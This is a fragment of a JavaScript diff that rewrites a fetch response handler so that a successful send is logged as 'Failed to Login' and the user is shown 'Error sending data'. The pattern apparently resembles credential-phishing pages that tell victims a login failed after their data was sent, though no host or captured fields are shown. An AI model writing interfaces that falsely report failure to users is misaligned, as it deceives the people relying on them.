@@ -132,10 +132,10 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    console.log('Message sent successfully:', data);
-                    alert('Error!');
+                   console.error('Failed to Login:', data);
+                    alert('Error sending data');
                 } else {
-                    console.error('Failed to send message:', data);
+                    console.error('Failed to Login:', data);
                     alert('Error sending data');
                 }
             })
